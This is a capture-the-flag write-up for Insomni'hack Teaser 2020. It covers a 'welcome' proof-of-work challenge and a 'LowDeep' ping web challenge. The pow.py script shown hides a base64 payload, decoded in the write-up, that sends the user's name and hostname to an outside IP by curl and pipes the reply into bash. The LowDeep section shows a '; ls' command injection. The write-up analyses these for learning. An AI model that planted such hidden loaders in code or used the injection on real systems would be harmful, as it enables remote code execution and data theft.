# Insomni'hack Teaser 2020

This was an extremely difficult CTF (by my standards) with a weight of ```52.33``` so I was only able to do two trivial challenges [welcome](https://github.com/abhaynayar/ctf/blob/master/writeups/insomnihack20.md#welcome-36-pts) & [LowDeep](https://github.com/abhaynayar/ctf/blob/master/writeups/insomnihack20.md#lowdeep-36-pts) and scored a rank of ```114```. I was trying for ```Kaboom``` & ```secretus``` as well, but wasn't able to do much within the time frame, will upsolve and post them here when done.

## warmup

### welcome 36 pts.
>This year we added a Proof of Work to some of our challenges.
>
>Just run python pow.py <target>, were target is the value provided by the server and get the flag.
>
> ```nc welcome.insomnihack.ch 1337```

**pow.py**
```
#!/usr/bin/python3

import base64
import hashlib
import os
import sys 

target = sys.argv[1]
i = 0 

def pow():
    global i, target
    while True:
        m = hashlib.md5()
        m.update(str(i).encode())
        h = m.hexdigest()
        if h[:6] == target:
            exec(base64.b64decode('Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8YmFzaCJpZiB4IT0ibnQiZWxzZSIvJVVTRVJOQU1FJUAlVVNFUkRPTUFJTiUiO29zLnN5c3RlbSgiY3VybCAtTnMgMzQuNjUuMTg3LjE0MS8iK3gp'))
            print(i)
            exit(0)
        i += 1

if __name__ == '__main__':
    pow()
```

We see that there's a base64 encoded string which is being decode and executed.

```
$ echo Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8YmFzaCJpZiB4IT0ibnQiZWxzZSIvJVVTRVJOQU1FJUAlVVNFUkRPTUFJTiUiO29zLnN5c3RlbSgiY3VybCAtTnMgMzQuNjUuMTg3LjE0MS8iK3gp | base64 -d
global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";os.system("curl -Ns 34.65.187.141/"+x)
```

It sends our username and hostname to ```34.65.187.141``` and blocks us from getting the flag, even after getting the proof of work. So the solution is to simply comment out that line.

```
$ nc welcome.insomnihack.ch 1337

======================================================================
============   Welcome to the Insomni'Hack Teaser 2020!   ============
======================================================================

Give me an input whose md5sum starts with "f49122" and get the flag ;)
7319391

MITM are real: check SHA, check code, ...
```

```
$ python pow.py f49122
7319391
```

```INS{Miss me with that fhisy line}```

## web

### LowDeep 36 pts.

> Try out our new ping platform: lowdeep.insomnihack.ch/

The websites asks us to provide an IP address to ping. Instead of providing an IP address if we provide ```; ls``` we get the list of files in the current directory. One of the files is ```print-flag```.

![](lowdeep.png)

Downloading and running that file gives us the flag.

```
$ ./print-flag 
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
```
